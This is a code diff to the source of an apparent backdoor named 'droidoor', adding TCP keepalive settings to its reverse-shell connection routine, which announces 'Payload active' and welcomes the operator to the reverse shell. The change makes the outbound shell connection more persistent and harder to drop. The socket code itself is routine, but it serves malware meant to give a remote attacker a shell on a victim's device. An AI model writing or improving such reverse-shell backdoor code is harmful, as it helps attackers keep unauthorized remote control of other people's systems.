@@ -1,3 +1,18 @@
+#ifndef TCP_KEEPIDLE
+    #ifdef TCP_KEEPALIVE
+        #define TCP_KEEPIDLE TCP_KEEPALIVE
+    #else
+        #define TCP_KEEPIDLE 4
+    #endif
+#endif
+
+#ifndef TCP_KEEPINTVL
+    #define TCP_KEEPINTVL 5
+#endif
+#ifndef TCP_KEEPCNT
+    #define TCP_KEEPCNT 6
+#endif
+
 #include "src/droidoor/rshell.hpp"
 #include <cstdint>
 #include <sys/socket.h>
@@ -8,6 +23,8 @@
 #include <string>
 #include <unistd.h>
 #include <sys/wait.h>
+#include <netinet/tcp.h>
+
 
 namespace droidoor
 {
@@ -25,7 +42,16 @@ namespace droidoor
     if (is_connected){
         throw std::runtime_error("Already connected !");
     }
+    int optval = 1;
+    setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
 
+    int idle = 30; 
+    int intvl = 10;
+    int cnt = 3;
+
+    setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &idle, sizeof(idle));
+    setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &intvl, sizeof(intvl));
+    setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &cnt, sizeof(cnt));
     if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) == 0){
 
         msg = "Payload active !\nWelcome to droidoor reverse shell\n";
